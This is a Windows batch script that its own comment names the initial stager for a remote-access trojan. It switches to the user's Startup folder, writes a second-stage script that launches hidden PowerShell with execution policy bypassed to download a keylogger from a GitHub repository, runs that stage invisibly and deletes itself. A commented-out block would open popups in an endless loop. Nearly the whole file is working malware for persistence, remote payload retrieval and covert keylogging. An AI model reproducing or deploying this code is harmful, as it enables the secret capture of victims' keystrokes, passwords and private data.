@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem generate payload
(
    echo @echo off
    echo powershell.exe -noP -W hidden -exec bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/resources/keylogger-pwsh/keylogger.ps1?token=GHSAT0AAAAAAC5TIRDFINRWF6YGF7MV7CFIZ4PI5JQ' -outfile '.\x.ps1'"
)>stage2.cmd

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\stage2.cmd"

@rem move back to saved directory
cd %InitialPath%

del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

